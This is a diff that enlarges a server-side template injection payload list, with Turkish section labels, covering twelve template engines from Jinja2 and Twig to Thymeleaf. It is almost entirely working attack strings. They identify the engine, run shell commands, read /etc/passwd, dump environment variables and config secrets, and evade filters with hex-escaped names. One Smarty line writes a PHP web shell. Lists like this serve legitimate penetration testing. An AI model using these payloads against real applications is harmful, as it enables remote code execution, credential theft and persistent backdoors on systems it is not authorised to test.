@@ -1,44 +1,175 @@
+# SSTI Payloads — WebSecure
+# Jinja2 | Twig | FreeMarker | Velocity | Smarty | Mako | Pebble | ERB | EJS | Handlebars | Tornado | Thymeleaf
+
+# ── TESPIT (Polyglot — hangi engine olduğunu anlamak için) ──
 {{7*7}}
 ${7*7}
 #{7*7}
 *{7*7}
 {7*7}
-<%=7*7%>
+<%= 7*7 %>
 ${{7*7}}
+#{7*7}
+[[${7*7}]]
 {{7*'7'}}
+${7*'7'}
 #set($x=7*7)${x}
-${.freemarker_version}
-@{7*7}
-[[7*7]]
-{{config}}
-{{config.items()}}
-{{self}}
+@(7*7)
+{% 7*7 %}
+{%- 7*7 -%}
+${{"z".class}}
+{{'a'.toUpperCase()}}
 {{request}}
+{{config}}
+{{self}}
+{{self.__class__}}
+a{{b}}c
+
+# ── JINJA2 (Python) ──
+{{config.items()}}
+{{config.__class__.__init__.__globals__}}
+{{config['SECRET_KEY']}}
 {{request.environ}}
+{{request.environ['PATH']}}
+{{self.__dict__}}
 {{''.__class__.__mro__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
 {{''.__class__.__mro__[1].__subclasses__()}}
-{{lipsum.__globals__.os.popen('id').read()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}}{%endfor%}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.__class__._load_form_data.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{% import os %}{{os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
 {{lipsum.__globals__['os'].popen('id').read()}}
 {{cycler.__init__.__globals__.os.popen('id').read()}}
 {{joiner.__init__.__globals__.os.popen('id').read()}}
-{{namespace.__init__.__globals__.os.popen('id').read()}}
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}
-{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__func__.__globals__['linecache'].__dict__['os'].__dict__['system']('id')}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("id")["read"]() %} {{ a }} {% endwith %}
+
+# ── TWIG (PHP) ──
+{{7*7}}
+{{7*'7'}}
 {{dump(app)}}
-{{app.request.server.all}}
-{{["id"]|map("system")}}
-${"freemarker.template.utility.Execute"?new()("id")}
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-T(java.lang.Runtime).getRuntime().exec('id')
-T(java.lang.System).getenv()
-${T(java.lang.Runtime).getRuntime().exec('id')}
-#{T(java.lang.Runtime).getRuntime().exec('id')}
-*{T(java.lang.Runtime).getRuntime().exec('id')}
-<%=`id`%>
-<%= system('id') %>
-<%= IO.popen('id').read %>
+{{dump(app.request)}}
+{{app.request.server.all|join(',')}}
+{{"/etc/passwd"|file_excerpt(1,30)}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
+{{_self.env.setCache(false)}}{{_self.env.getCacheFilename(false)}}
+{{_self.env.loadTemplate("I".concat("D").concat(" = ").concat("1"))}}
+{{['id']|map('system')|join}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id',1]|sort('system')}}
+{{'id'|filter('system')}}
+{%set+a+%}id{%endset%}{{['bash','-c',a]|map('system')}}
+{% set arr = ['id'] %}{% for item in arr %}{{ item|e }}{% endfor %}
+{{_self|map('system')|join}}
+
+# ── FREEMARKER (Java) ──
+${7*7}
+${freeMarker.version}
+${product.class.protectionDomain.codeSource.location}
+${product.class.forName("java.lang.Runtime").getMethod("exec",product.class.forName("java.lang.String")).invoke(product.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
+${object.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(object.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+
+# ── VELOCITY (Java) ──
+#set($e="e")${e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+#set($runtime = $class.forName("java.lang.Runtime").getRuntime())
+#set($proc = $runtime.exec("id"))
+${proc.waitFor()}
+
+# ── SMARTY (PHP) ──
+{$smarty.version}
 {php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 {system('id')}
-{php}echo system('id');{/php}
+{exec('id')}
+{passthru('id')}
+{$x='id'}{exec($x)}
+{_phpStrip}<?php echo system('id');?>{/strip}
+
+# ── MAKO (Python) ──
+${7*7}
+${"".__class__.__mro__[2].__subclasses__()}
+${"".join(map(chr,[105,100]))}
+<%import os%>${os.popen('id').read()}
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+<%!
+import os
+def execute(s):
+    return os.popen(s).read()
+%>
+${execute('id')}
+
+# ── PEBBLE (Java) ──
+{{7*7}}
+{{"a".toUpperCase()}}
+{{"a".class}}
+{% for i in "".class.forName("java.lang.ProcessBuilder").getDeclaredConstructors() %}{{i}}{% endfor %}
+{% set cmd = "id" %}
+{% set r = "".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),cmd) %}
+{{r}}
+
+# ── ERB (Ruby) ──
+<%= 7*7 %>
+<%= File.open('/etc/passwd').read %>
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+<% require 'open3'; stdout, stderr, status = Open3.capture3('id'); %><%= stdout %>
+<%= Dir.entries('/') %>
+
+# ── EJS (Node.js) ──
+<%= 7*7 %>
+<%= process.env %>
+<%= JSON.stringify(process.env) %>
+<% var x = require('child_process').execSync('id').toString(); %><%= x %>
+<%= require('child_process').execSync('id').toString() %>
+<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
+
+# ── HANDLEBARS (Node.js) ──
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id').toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+{{lookup (lookup this "constructor") "name"}}
+
+# ── TORNADO (Python) ──
+{% import os %}{{os.popen('id').read()}}
+{%import%}
+{{ handler.settings }}
+{{ handler.request.headers }}
+
+# ── THYMELEAF (Java) ──
+[[${7*7}]]
+[(${7*7})]
+__${7*7}__::.x
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+[[${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}]]
+
+# ── TESPIT KAÇIŞLARI ──
+{{7*7}}{{7*'7'}}
+{{'a'|capitalize}}
+{{'a'.constructor}}
+{{request.class}}
+${class.getName()}
+#set($a='')${a.class}
+<%= undefined %>
